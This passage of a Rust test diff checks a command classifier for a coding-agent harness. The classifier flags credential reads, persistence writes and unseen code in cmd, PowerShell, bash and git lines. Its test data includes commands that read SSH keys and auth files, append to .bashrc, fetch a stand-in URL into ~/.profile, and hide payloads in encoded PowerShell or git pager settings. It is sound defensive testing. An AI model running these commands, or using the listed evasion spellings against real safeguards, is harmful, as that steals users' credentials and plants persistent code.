+            r#"start /D %USERPROFILE% cmd /c "echo a & echo x >> .bashrc""#,
+            Persistence,
+        ),
+        (r"xcopy /d %USERPROFILE% E:\b /e /i", Credentials),
+        // Review 3: a cd that fails or a popd leaves earlier folders possible.
+        (
+            r"cd /d %USERPROFILE%\AppData & pushd Local & popd & cd .. & echo x>>.bashrc",
+            Persistence,
+        ),
+        (
+            r"cd /d %USERPROFILE%\AppData && pushd Local && popd && cd .. && echo x>>.bashrc",
+            Persistence,
+        ),
+        (
+            r"cd /d %USERPROFILE%\AppData & cd nosuch & cd .. & echo x>>.bashrc",
+            Persistence,
+        ),
+        (r"cd/d %USERPROFILE% & echo x>>.bashrc", Persistence),
+        // Review 5: long spaced folders, `=` and `-x` folder names.
+        (
+            r"cd C:\work\1 2 3 4 5 6 7 8 9\..\..\Users\fixture & echo x >> .bashrc",
+            Persistence,
+        ),
+        (
+            r"cd C:\Users\fixture\a=b\.. & echo x >> .bashrc",
+            Persistence,
+        ),
+        (
+            r"cd -x\..\..\Users\fixture & echo x >> .bashrc",
+            Persistence,
+        ),
+        // Review 4: spaces in cmd's cd.
+        (
+            r"cd C:\Program Files\..\Users\fixture & echo x >> .bashrc",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(cmd(line), Some(expected), "cmd /c {line}");
+    }
+    for (line, expected) in [
+        // The #1240 table.
+        (
+            r"Get-Content C:\Users\fixture\.corbanu\auth.json",
+            Credentials,
+        ),
+        (r"Get-Content $env:USERPROFILE\.ssh\id_ed25519", Credentials),
+        (r"Get-Content ~\.ssh\id_ed25519", Credentials),
+        // Parameters, variables and .NET calls.
+        (r"Get-Content -Path:C:\Users\fixture\.netrc", Credentials),
+        (
+            r"Get-Content -LiteralPath '${env:USERPROFILE}\.netrc'",
+            Credentials,
+        ),
+        (r#"Get-Content "$($env:USERPROFILE)\.netrc""#, Credentials),
+        (r"gc $Env:CODEX_HOME\auth.json", Credentials),
+        (r"Get-Content $HOME\.aws\credentials", Credentials),
+        (
+            r"[IO.File]::ReadAllText('C:\Users\fixture\.corbanu\auth.json')",
+            Credentials,
+        ),
+        (
+            r"Copy-Item C:\Users\fixture\.corbanu\auth.json C:\tmp",
+            Credentials,
+        ),
+        (r"Add-Content -Path $HOME\.bashrc -Value x", Persistence),
+        (
+            r"Set-Content -LiteralPath '${env:USERPROFILE}\.gitconfig' -Value x",
+            Persistence,
+        ),
+        (
+            r"'x' | Out-File -FilePath $env:USERPROFILE\.zshrc -Append",
+            Persistence,
+        ),
+        (r"Copy-Item C:\evil C:\Users\fixture\.bashrc", Persistence),
+        (
+            r"Invoke-WebRequest https://x.example -OutFile ~\.profile",
+            Persistence,
+        ),
+        (
+            r#"[IO.File]::WriteAllText("$HOME\.bashrc", 'x')"#,
+            Persistence,
+        ),
+        (r"Set-Location ~; Add-Content .zshrc x", Persistence),
+        (
+            r"New-Item -ItemType File C:\work\.git\hooks\pre-push",
+            Persistence,
+        ),
+        (
+            r"Compress-Archive -Path $HOME -DestinationPath x.zip",
+            Credentials,
+        ),
+        (r"Copy-Item -Recurse C:\Users\fixture D:\x", Credentials),
+        (r"& 'C:\Tools\corbanu.exe' vault list", Vault),
+        // Review 1: folder parameters, provider paths, unknown variables.
+        (r"Set-Location -Path:~; Add-Content .bashrc x", Persistence),
+        (r"Set-Location -Path ~; Add-Content .bashrc x", Persistence),
+        (r"sl -LiteralPath $HOME; ac .profile x", Persistence),
+        (r"Add-Content FileSystem::$HOME\.bashrc x", Persistence),
+        (
+            r"Add-Content Microsoft.PowerShell.Core\FileSystem::C:\Users\fixture\.bashrc x",
+            Persistence,
+        ),
+        (r"Add-Content $env:TEMP\..\..\..\.bashrc x", UnseenCode),
+        // Review 2: switches before the folder, PowerShell's bare `cd`.
+        (
+            r"Set-Location -PassThru ~; Add-Content .bashrc x",
+            Persistence,
+        ),
+        (r"cd; Add-Content .bashrc x", Persistence),
+        (
+            r"Push-Location -StackName s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+        // Paths built from parts.
+        (r"Add-Content (Join-Path $HOME '.bashrc') 'x'", Persistence),
+        (r"Join-Path -Path $HOME -ChildPath .ssh\id_rsa", Credentials),
+        (
+            r"[IO.File]::AppendAllText([IO.Path]::Combine($HOME, '.zshrc'), 'x')",
+            Persistence,
+        ),
+        (r#"Add-Content ("$HOME" + "\.profile") x"#, Persistence),
+        (
+            r"New-Item -Path $HOME -Name .bash_profile -Value x",
+            Persistence,
+        ),
+        (
+            r"ni $env:USERPROFILE -Name .gitconfig -Value x -Force",
+            Persistence,
+        ),
+        (
+            r"$p = [Environment]::GetFolderPath('UserProfile')",
+            UnseenCode,
+        ),
+    ] {
+        assert_eq!(powershell(line), Some(expected), "powershell {line}");
+    }
+    // Not through a shell: an argv run as it is.
+    for (command, expected) in [
+        (&[r"C:\Tools\corbanu.exe", "vault", "list"][..], Vault),
+        (&["corbanu.exe", "vault", "list"], Vault),
+        (
+            &[
+                "cmd.exe",
+                "/c",
+                "type",
+                r"C:\Users\fixture\.corbanu\auth.json",
+            ],
+            Credentials,
+        ),
+        (
+            &["cmd.exe", "/c", "copy", "x", r"C:\Users\fixture\.bashrc"],
+            Persistence,
+        ),
+        // POSIX lines on Windows: the user's home is a Windows folder.
+        (&["bash", "-lc", "echo x >> ~/.bashrc"], Persistence),
+        (&["bash", "-lc", "echo x >> $HOME/.zshrc"], Persistence),
+        (&["bash", "-lc", "cat ~/.docker/config.json"], Credentials),
+        (
+            &["bash", "-lc", "cat C:/Users/fixture/.corbanu/auth.json"],
+            Credentials,
+        ),
+        (&["bash", "-lc", "cd ~ && echo x >> .profile"], Persistence),
+    ] {
+        assert_eq!(windows_kind(command), Some(expected), "{command:?}");
+    }
+    // PowerShell's encoded commands are decoded; undecodable ones fail closed.
+    let encoded = |text: &str| {
+        use base64::Engine as _;
+        base64::engine::general_purpose::STANDARD.encode(
+            text.encode_utf16()
+                .flat_map(u16::to_le_bytes)
+                .collect::<Vec<u8>>(),
+        )
+    };
+    assert_eq!(
+        windows_kind(&[
+            "powershell.exe",
+            "-EncodedCommand",
+            &encoded(r"Get-Content $env:USERPROFILE\.ssh\id_rsa"),
+        ]),
+        Some(Credentials)
+    );
+    assert_eq!(
+        windows_kind(&["pwsh", "-enc", &encoded("Add-Content ~\\.bashrc x")]),
+        Some(Persistence)
+    );
+    assert_eq!(
+        windows_kind(&["powershell", "-e", "not base64!"]),
+        Some(UnseenCode)
+    );
+    // Review 1: `/` prefixes, other encoded parameters, the working folder.
+    assert_eq!(
+        windows_kind(&[
+            "powershell.exe",
+            "/enc",
+            &encoded(r"Get-Content $env:USERPROFILE\.ssh\id_rsa"),
+        ]),
+        Some(Credentials)
+    );
+    assert_eq!(
+        windows_kind(&["pwsh", "-ea", "not base64!", "-c", "dir"]),
+        Some(UnseenCode)
+    );
+    // Review 5: a value-taking parameter this reading may not know.
+    for parameter in ["-ConfigurationFile", "-SomeFutureParameter"] {
+        assert_eq!(
+            windows_kind(&[
+                "pwsh",
+                parameter,
+                "a.pssc",
+                "-EncodedCommand",
+                &encoded(r"Add-Content ~\.bashrc x"),
+            ]),
+            Some(Persistence),
+            "{parameter}"
+        );
+    }
+    // Review 3: a nested PowerShell's parameters; the payload runs from
+    // each folder the line may be in.
+    let add_bashrc = encoded("Add-Content .bashrc x");
+    for line in [
+        format!("pwsh -c pwsh -enc {}", encoded(r"Add-Content ~\.bashrc x")),
+        format!(r"cd /d %USERPROFILE% & cd nosuch & pwsh -enc {add_bashrc}"),
+        format!(r"cd /d %USERPROFILE% & pushd AppData & popd & pwsh -enc {add_bashrc}"),
+    ] {
+        assert_eq!(cmd(&line), Some(Persistence), "{line}");
+    }
+    for script in ["Add-Content .bashrc x", "Get-Date; Add-Content .bashrc x"] {
+        assert_eq!(
+            windows_kind(&["pwsh", "-WorkingDirectory", "~", "-Command", script]),
+            Some(Persistence),
+            "{script}"
+        );
+    }
+    assert_eq!(
+        windows_kind(&[
+            "cmd.exe",
+            "/c",
+            "cd",
+            "/d",
+            "%USERPROFILE%",
+            "&",
+            "echo",
+            "x",
+            ">>",
+            ".bashrc",
+        ]),
+        Some(Persistence)
+    );
+    // Review 4: a folder past the length limit fails closed (and the next
+    // command still has folders to resolve against).
+    assert_eq!(
+        cmd(&format!(
+            "cd {} && dir && echo x >> %USERPROFILE%\\.bashrc",
+            "a".repeat(1100)
+        )),
+        Some(Persistence)
+    );
+    assert_eq!(
+        cmd(&format!("cd {} && dir", "a".repeat(1100))),
+        Some(UnseenCode)
+    );
+    // Too many folders the line may be in fails closed.
+    let siblings: String = (0..20).map(|n| format!("cd d{n} & cd .. & ")).collect();
+    assert_eq!(cmd(&format!("{siblings}dir")), Some(UnseenCode));
+    // Another drive's current folder cannot be known: it fails closed.
+    for line in [
+        r"echo x >> C:.bashrc",
+        r"cd /d C: & echo x >> .bashrc",
+        "C: & echo x >> .bashrc",
+    ] {
+        assert_eq!(
+            windows_kind_with(WINDOWS_HOME, r"D:\work", &["cmd", "/c", line]),
+            Some(UnseenCode),
+            "D:\\work> {line}"
+        );
+    }
+    // A Corbanu home elsewhere, named only by its path.
+    for (line, expected) in [
+        (
+            r"type D:\corbanu-terminal\home\config.toml",
+            Some(SecurityPolicy),
+        ),
+        (
+            r"type d:\CORBANU-TERMINAL\home\auth.json",
+            Some(Credentials),
+        ),
+        (r"type D:\corbanu-terminal\homework.txt", None),
+    ] {
+        assert_eq!(
+            windows_kind_with(
+                r"D:\corbanu-terminal\home",
+                r"C:\work",
+                &["cmd", "/c", line]
+            ),
+            expected,
+            "{line}"
+        );
+    }
+    // Relative to a working folder in the home.
+    for (cwd, line, expected) in [
+        // Review 4: a move that fails, does not run or does not move keeps
+        // the folders before it.
+        (
+            r"C:\Users\fixture\proj",
+            r"cd nosuch && rem & echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"echo cd sub && echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"cd D:\tmp && echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"cd && echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"if exist x (cd x && echo a) & echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (r"C:\Users\fixture\.corbanu", "type auth.json", Credentials),
+        (r"C:\Users\fixture", r"type .corbanu\auth.json", Credentials),
+        (r"C:\Users\fixture\proj", r"type ..\.netrc", Credentials),
+        (
+            r"C:\Users\fixture\proj",
+            r"echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            "cd .. & echo x >> .bashrc",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(
+            windows_kind_with(WINDOWS_HOME, cwd, &["cmd", "/c", line]),
+            Some(expected),
+            "{cwd}> {line}"
+        );
+    }
+}
+
+/// #1240: ordinary Windows work is not judged protected.
+#[test]
+fn issue_1240_ordinary_windows_commands_are_not_protected() {
+    for line in [
+        "dir",
+        "type README.md",
+        r"type src\main.rs",
+        "copy a.txt b.txt",
+        "echo hi > out.txt",
+        r"cd /d C:\work\sub & dir",
+        r"type C:\Users\fixture\proj\README.md",
+        r"type C:\Users\fixture\.corbanu\worktrees\x\src\lib.rs",
+        r"type C:\Users\fixture\.codex-work\notes.txt",
+        r"del /q build\*",
+        "git.exe status",
+        "cargo test -p codex-core",
+        // Review 1: several folder changes are followed, not compounded.
+        r"cd sub & cd sub2 & cd ..\sub3 & cd .. & dir",
+        r"cd a && make && cd .. && cd b && make && cd .. && cd c && make && cd ..",
+        r"echo x > %TEMP%\out.txt",
+        r"type C:README.md",
+        "cargo test a::tests e:true: -- x:y",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+    for line in [
+        r"Get-Content src\main.rs",
+        r"Get-ChildItem -Recurse C:\work\src",
+        "Set-Content -Path notes.txt -Value x",
+        r"Get-Content C:\work\x.txt | Out-File C:\work\y.txt",
+        r"Copy-Item -Recurse C:\work\src C:\work\backup",
+        r"Remove-Item -Recurse -Force target\debug",
+        r"Select-String -Path *.rs -Pattern vault",
+        r"$env:RUST_LOG = 'debug'; cargo test",
+        r"Write-Output $HOME",
+        r"New-Item -ItemType Directory C:\work\out",
+        r"Join-Path $HOME 'proj\README.md'",
+        r"[Environment]::GetEnvironmentVariable('PATH')",
+        r"Set-Location src; Set-Location ..\docs; Get-Content README.md",
+        r#"curl.exe -s -d '{"a":{"b":1},"e":{"f":2}}' https://api.example"#,
+        // Review 2: `-e…` words of the command are not PowerShell's own.
+        "Get-Content a.txt -Encoding utf8 -ErrorAction Stop -Exclude *.log",
+        r"echo x > %CD%\..\work\out.txt",
+    ] {
+        assert_eq!(powershell(line), None, "powershell {line}");
+    }
+}
+
+/// #1240: the Windows reading stays linear in the line's length (both
+/// judgments are measured). One test per unit, so none runs long.
+macro_rules! issue_1240_windows_checks_are_linear {
+    ($($name:ident: $unit:literal,)*) => {
+        mod issue_1240_windows_checks_are_linear {
+            use super::*;
+            $(
+                #[test]
+                fn $name() {
+                    work::assert_linear(stringify!($name), |scale| {
+                        let _ = powershell(&$unit.repeat(100 * scale));
+                    });
+                }
+            )*
+        }
+    };
+}
+
+issue_1240_windows_checks_are_linear! {
+    paths: r"type C:\a\b\c.txt & ",
+    variables: r"%USERPROFILE%\x $env:HOME\y ${env:CODEX_HOME} ",
+    redirections: r"echo x >> C:\a\b 2>&1 ",
+    writers: r"copy a b; Set-Content -Path c -Value d; ",
+    // Relative moves multiply the folders up to the cap (tested apart).
+    folders: r"cd /x & cd .. & pushd \y & popd & ",
+    // `` ` `` is left out: the POSIX reading takes it for a substitution.
+    quotes: r#"'a b' "c d" e^f "#,
+    operators: "|&;(){},<> ",
+    percents: "%a% %% % ",
+    // One command: each `ni` and join looks only a few words ahead.
+    joins: "ni -Name b Join-Path a b c + d [IO.Path]::Combine e f ",
+}
+
+/// #1240 review 6: parameters before a folder, a spent budget, and a word
+/// named like `cd` inside a long command.
+#[test]
+fn issue_1240_review_6_routes() {
+    use ProtectedActionKind::*;
+    for (line, expected) in [
+        (
+            r"Push-Location -StackName:s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+        (
+            r"Set-Location -ErrorAction SilentlyContinue $env:USERPROFILE\.corbanu; Get-Content auth.json",
+            Credentials,
+        ),
+        // Review 7: the shortest prefixes.
+        (
+            r"Push-Location -st s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+        (
+            r"Push-Location -s s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(powershell(line), Some(expected), "{line}");
+    }
+    // Review 7: a long spelling of cmd's cd that normalizes to a folder.
+    assert_eq!(
+        cmd(&format!(
+            r"cd C:\Users\fixture\x y\..{} & echo x>>.bashrc",
+            r"\.".repeat(600)
+        )),
+        Some(Persistence)
+    );
+    // `ci/cd` in a long message is not a folder change.
+    let files: String = (0..200).map(|n| format!(r"src\file{n}.rs ")).collect();
+    assert_eq!(cmd(&format!("git add ci/cd {files}")), None);
+    assert_eq!(
+        powershell(&format!(
+            "git commit -m \"Update CI/CD: {}\"",
+            "word ".repeat(300)
+        )),
+        None
+    );
+}
+
+/// D153: since #1159, a name such as `git.exe` split out of quoted text ended
+/// the git scan, so `git -c 'user.name=a git.exe b' -c core.pager=sh log`
+/// no longer asked. A `-c`/`--config-env` setting whose text holds a git
+/// name asks, and the scan from `git` reads on past other git names, as
+/// before #1159.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d153_git_names_in_quoted_text_do_not_end_the_git_checks() {
+    for command in [
+        // The line from #1230's review, and the same text written other ways.
+        "git -c 'user.name=a git.exe b' -c core.pager=sh log",
+        "git -c \"user.name=a git.exe b\" -c core.pager=sh log",
+        "git -c 'user.name=a GIT.EXE b' -c core.pager=sh log",
+        "git -c 'user.name=a /usr/bin/git.exe b' -c core.pager=sh log",
+        "git -c 'user.name=a C:\\Git\\cmd\\git.exe b' -c core.pager=sh log",
+        "git -c 'user.name=a,git.exe b' -c core.pager=sh log",
+        "git -c 'user.name=a;git.exe b' -c core.pager=sh log",
+        "git -c 'user.name=a g\"i\"t.exe b' -c core.pager=sh log",
+        "git -c'user.name=a git.exe b' -c core.pager=sh log",
+        "git --config-env 'user.name=a git.exe b' -c core.pager=sh log",
+        "git --config-env='user.name=a git.exe b' -c core.pager=sh log",
+        // Other git names in the text, other git commands.
+        "git -c 'user.name=a git b' -c core.pager=sh log",
+        "git -c 'user.name=a git-log b' -c core.pager=sh log",
+        "git.exe -c 'user.name=a git.exe b' -c core.pager=sh log",
+        "env git -c 'user.name=a git.exe b' -c core.pager=sh log",
+        "sh -c \"git -c 'user.name=a git.exe b' -c core.pager=sh log\"",
+        // A git name split out of other quoted text: the scan from `git`
+        // reads on past it, as before #1159.
+        "git -C 'dir git.exe x' -c core.pager=sh log",
+        "git --namespace 'a git.exe b' -c core.pager=sh log",
+        "git -C git.exe b -c core.pager=sh log",
+        "git --namespace=./git.exe b -c core.pager=sh log",
+        // Review round 1: spellings the lexer reads as a git name, other
+        // options from `git.exe`, and a plain `git` (which main missed).
+        "git.exe -c 'user.name=a g{it.exe b' -c core.pager=sh log",
+        "git -c 'user.name=a g{it b' -c core.pager=sh log",
+        "git.exe -c \"user.name=a git$'.exe' b\" -c core.pager=sh log",
+        "git.exe -c 'user.name=a$IFS\"git.exe\" b' -c core.pager=sh log",
+        "git.exe --namespace 'a git.exe b' -c core.pager=sh log",
+        "git.exe --namespace='a git.exe b' -c core.pager=sh log",
+        "git.exe -C git.exe b -c core.pager=sh log",
+        "git.exe -C 'x git.exe y git.exe z' -c core.pager=sh log",
+        "git.exe --namespace=./git.exe b -c core.pager=sh log",
+        "git --namespace 'a git b' -c core.pager=sh log",
+        "git -C 'x git y git z' -c core.pager=sh log",
+        "git --namespace=./git b -c core.pager=sh log",
+        "x=git.exe; git -C \"a $x b\" -c core.pager=sh log",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::UnseenCode),
+            "{command}"
+        );
+    }
+    assert_eq!(
+        kind(&[
+            "git",
+            "-c",
+            "user.name=a git.exe b",
+            "-c",
+            "core.pager=sh",
+            "log"
+        ]),
+        Some(ProtectedActionKind::UnseenCode)
+    );
+    for command in [
+        "git -c user.name=git log",
+        "git -c 'user.name=Ada Lovelace' commit -m x",
+        "git commit -m 'fix the git.exe path'",
+        "git.exe commit -m 'fix the git.exe path'",
+        "git -C git status",
+        "git -C repo log -1 git.exe",
+        "git log --grep 'git.exe crash' --oneline",
+        "git.exe status",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// D153: the git checks stay linear when git names repeat in options and
+/// quoted settings.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d153_checks_are_linear() {
+    for (label, unit) in [
+        ("git.exe values", "-C a git.exe "),
+        ("git.exe options", "--namespace=./git.exe "),
+        ("quoted settings", "-c 'user.name=a b' "),
+        ("quoted names", "'a git.exe b' "),
+        ("git.exe then text", "-C x git.exe a "),
+        ("git then text", "-C x git a "),
+        ("names in values", "-C git.exe -C git "),
+    ] {
+        // 100 repeats: the work counts are compared, not the clock, and the
+        // classifier's fixed cost stays under 4% of the 1x count.
+        work::assert_linear(label, |scale| {
+            let line = format!("git {} status", unit.repeat(100 * scale));
+            let _ = script(&line);
+            let line = format!("git.exe {} status", unit.repeat(100 * scale));
+            let _ = script(&line);
+        });
+    }
+}
+
+/// #1275: the checks run on each command word of a line (`gh`, `crontab`,
+/// `launchctl`, `systemctl`, the Corbanu CLI) look at the words after it
+/// once per line, not once per copy of the word.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1275_command_word_checks_are_linear() {
+    for (label, unit) in [
+        ("gh", "gh "),
+        ("security", "security "),
+        ("crontab", "crontab "),
+        ("launchctl", "launchctl "),
+        ("systemctl", "systemctl --user "),
+        ("corbanu", "corbanu "),
+        ("codex values", "codex -c "),
+        ("pfterminal flags", "pfterminal --x "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let _ = script(&format!("echo {}", unit.repeat(100 * scale)));
+        });
+    }
+}
+
+/// #1275: a glob pattern stops at its first difference from the name
+/// before its first glob character, so a long word compared with short
+/// names is not read in full each time; matches are unchanged.
+#[test]
+fn issue_1275_glob_stops_at_first_difference() {
+    use super::paths::glob_any;
+    for (pattern, name, expected) in [
+        ("", "", true),
+        ("", "a", false),
+        ("a", "", false),
+        ("gh", "gh", true),
+        ("gh", "ghx", false),
+        ("ghx", "gh", false),
+        ("g*", "gh", true),
+        ("h*", "gh", false),
+        ("gh*", "g", false),
+        ("g?", "gh", true),
+        ("g[a-z]", "gh", true),
+        ("[", "[", true),
+        ("x[", "x[", true),
+        ("*h", "gh", true),
+        ("é*", "éa", true),
+        ("é*", "ea", false),
+        ("ab*cd", "abxxcd", true),
+        ("ab*cd", "abxxce", false),
+    ] {
+        assert_eq!(glob_any(pattern, name), expected, "{pattern:?} {name:?}");
+    }
+    let long = "a".repeat(100_000);
+    let long_glob = format!("{long}*");
+    let counted = work::measure(|| {
+        assert!(!glob_any(&long, "auth.json"));
+        assert!(!glob_any(&long_glob, "abc"));
+    });
+    // Neither reads the long word nor copies it for the full match.
+    assert!(counted.steps < 100 && counted.bytes == 0, "{counted:?}");
+}
+
+/// #1255: `git config` opens the config file in an editor (`-e`, `--edit`,
+/// `--ed`, `-ze`, `edit`, `-- -e`), global config too. What the editor
+/// writes is config the classifier never sees, so after untrusted content
+/// the line asks like a config write that may set a key that runs a program.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1255_git_config_editor_is_persistence() {
+    for command in [
+        "git config -e",
+        "git config --edit",
+        "git config --ed",
+        "git config edit",
+        "git config edit --local",
+        "git config -- -e",
+        "git config -- --edit",
+        "git config -- --local -e",
+        "git config --global -e",
+        "git config --system --edit",
+        "git config -ze",
+        "git config -z -e",
+        "git config --file=y -e",
+        "git config -fy -e",
+        "git config --type=bool -e",
+        "git config -e x",
+        "git config --fil /tmp/zz -e",
+        "git config --typ bool -e",
+        "git config --ty bool -e",
+        "git -C config config -e",
+        "git -C config config --global -e",
+        "GIT_EDITOR=true git config -e",
+        "git -C repo config -e",
+        "git -C /tmp/git-x config -e",
+        "git --work-tree /src/git-tools config --edit",
+        "git -c user.name=x config -e",
+        "git.exe config -e",
+        "git-config -e",
+        "/usr/lib/git-core/git-config --edit",
+        "env git config edit",
+        "sh -c 'git config -e'",
+        "true && git config --edit",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+    for command in [
+        "git config user.name -e",
+        "git config --local user.name -e",
+        "git config -- edit",
+        "git config --comment -e",
+        "git config --get user.name",
+        "git config --list",
+        "git commit -e -m x",
+        "git grep -e config src",
+        "git log -e",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1255: a word that only looks like git (a last path segment `git-x`, a
+/// folder named `git`) in a value or option does not end the git checks:
+/// the scan from `git` reads past dashed-helper names, and one that stops
+/// at a `git` word is taken up again by the scan from that word.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1255_git_lookalike_words_do_not_end_the_git_checks() {
+    use ProtectedActionKind::*;
+    for (command, want) in [
+        ("git -C /tmp/git-x -c core.pager=sh log", UnseenCode),
+        ("git -C /tmp/git-x/ -c core.pager=sh log", UnseenCode),
+        ("git -C git-x -c core.pager=sh log", UnseenCode),
+        ("git -C a/git-x/ -c core.pager=sh log", UnseenCode),
+        (
+            "git --work-tree /src/git-tools -c core.pager=sh log",
+            UnseenCode,
+        ),
+        ("git --git-dir /tmp/git-x -c core.pager=sh log", UnseenCode),
+        (
+            "git --namespace /tmp/git-x -c core.pager=sh log",
+            UnseenCode,
+        ),
+        ("git -C /src/git -c core.pager=sh log", UnseenCode),
+        ("git -C /tmp/git -c core.pager=sh log", UnseenCode),
+        ("git -C /src/git.exe -c core.pager=sh log", UnseenCode),
+        ("git.exe -C /tmp/git-x -c core.pager=sh log", UnseenCode),
+        ("git.exe -C /src/git -c core.pager=sh log", UnseenCode),
+        ("git -C /tmp/git-x -ccore.pager=sh log", UnseenCode),
+        ("git -C /tmp/git-x --exec-path=/tmp/e log", UnseenCode),
+        (
+            "git -C /tmp/git-x --config-env=core.pager=X log",
+            UnseenCode,
+        ),
+        (
+            "git -c user.name=/tmp/git-x -c core.pager=sh log",
+            UnseenCode,
+        ),
+        (
+            "git -c 'user.name=a /tmp/git-x' -c core.pager=sh log",
+            UnseenCode,
+        ),
+        (
+            "git -c credential.https://h/git-lfs.helper=sh fetch",
+            UnseenCode,
+        ),
+        (
+            "git -c includeIf.gitdir:/x/git-y.path=/tmp/c log",
+            UnseenCode,
+        ),
+        ("sh -c 'git -C /tmp/git-x -c core.pager=sh log'", UnseenCode),
+        ("git -C /tmp/git-x config core.pager sh", Persistence),
+        ("git -C /tmp/git-x config --global user.name x", Persistence),
+        (
+            "git --work-tree /src/git-tools config core.pager sh",
+            Persistence,
+        ),
+        ("git -C /src/git config core.pager sh", Persistence),
+        ("git config core.pager /tmp/git-x", Persistence),
+        ("git config -/git-x core.pager sh", Persistence),
+        ("git -C /tmp/git-x log --output=$HOME/.zshrc", Persistence),
+        (
+            "git --work-tree /src/git-x log --output=$HOME/.zshrc",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(script(command), Some(want), "{command}");
+    }
+}
+
+/// #1255: the editor check stays linear when `config` and editor options
+/// repeat.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1255_checks_are_linear() {
+    for (label, unit) in [
+        ("config words", "config "),
+        ("value options", "-f -e "),
+        ("flags", "--local "),
+        ("separators", "-- "),
+        ("git config words", "git config "),
+        ("lookalike folders", "-C /tmp/git-x "),
+        ("config as a value", "-C config --fil "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let line = format!("git {} status", unit.repeat(400 * scale));
+            let _ = script(&line);
+            let line = format!("git config {} -e", unit.repeat(400 * scale));
+            let _ = script(&line);
+        });
+    }
+}
+
+/// #1268: git run by a launcher that adds words from its input (`xargs`,
+/// `parallel`, `find -exec`, `fd -x`), or given positional parameters, may
+/// get its options or what `git config` writes from words the classifier
+/// never sees: it asks unless git has read its subcommand first and that
+/// is not a `git config` write.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1268_git_given_input_words_asks() {
+    use ProtectedActionKind::*;
+    for (command, want) in [
+        (
+            "printf 'filter.a.clean /tmp/x' | xargs git config",
+            Persistence,
+        ),
+        ("printf -- '-c core.pager=sh log' | xargs git", UnseenCode),
+        ("xargs git config < f", Persistence),
+        ("xargs -a f git config", Persistence),
+        ("xargs -n 2 -0 git config", Persistence),
+        ("xargs git config user.name", Persistence),
+        ("xargs git config -f f", Persistence),
+        ("xargs -I{} git config {}", UnseenCode),
+        ("xargs -I{} git {} log", UnseenCode),
+        ("xargs -I % git % log", UnseenCode),
+        ("xargs -0I% git % log", UnseenCode),
+        ("xargs --replace=R git R log", UnseenCode),
+        ("xargs --repl=R git R log", UnseenCode),
+        ("xargs -J % git % log", UnseenCode),
+        ("xargs -i git {} log", UnseenCode),
+        ("xargs git -C repo", UnseenCode),
+        ("xargs git -C repo log", UnseenCode),
+        ("xargs git.exe", UnseenCode),
+        ("xargs git.exe config", Persistence),
+        ("xargs git-config", Persistence),
+        ("xargs -I{} git-{}", UnseenCode),
+        ("xargs -I{} git-{} core.pager sh", UnseenCode),
+        ("xargs -I{} git-{}.exe", UnseenCode),
+        // The word lexer drops braces: with one in the line, any word may
+        // have held a placeholder.
+        ("xargs -I{} git log {}", UnseenCode),
+        ("find . -name '*.rs' -exec git l{}og \\;", UnseenCode),
+        ("xargs -I@ git-@", UnseenCode),
+        ("sudo xargs git config", Persistence),
+        ("nice xargs -r git config", Persistence),
+        ("XARGS git config", Persistence),
+        ("find . -exec git {} +", UnseenCode),
+        ("find . -exec git config {} \\;", UnseenCode),
+        ("find . -execdir git config {} +", UnseenCode),
+        ("find . -ok git config {} \\;", UnseenCode),
+        ("fd -X git config", Persistence),
+        ("fd . -x git {}", UnseenCode),
+        ("parallel git config", Persistence),
+        ("ls | parallel git", UnseenCode),
+        ("parallel git ::: config", UnseenCode),
+        ("parallel git config ::: user.name ::: x", Persistence),
+        ("parallel -j4 git {} ::: log", UnseenCode),
+        ("xargs sh -c 'git config \"$@\"' _", Persistence),
+        (
+            "find . -exec sh -c 'git config \"$1\" \"$2\"' _ {} \\;",
+            UnseenCode,
+        ),
+        ("sh -c 'git config $1 $2'", Persistence),
+        ("git config \"${@}\"", Persistence),
+        ("git-config \"$*\"", Persistence),
+        ("env -S'git config core.pager sh'", Persistence),
+        ("env --split-string='git config core.pager sh'", Persistence),
+        ("env -iS'git -c core.pager=sh log'", UnseenCode),
+        // A launcher's input after `env -S` (review of #1273).
+        (
+            "printf 'core.pager sh' | xargs env -S'git config'",
+            Persistence,
+        ),
+        (
+            "printf -- '-c core.pager=sh log' | xargs env -Sgit",
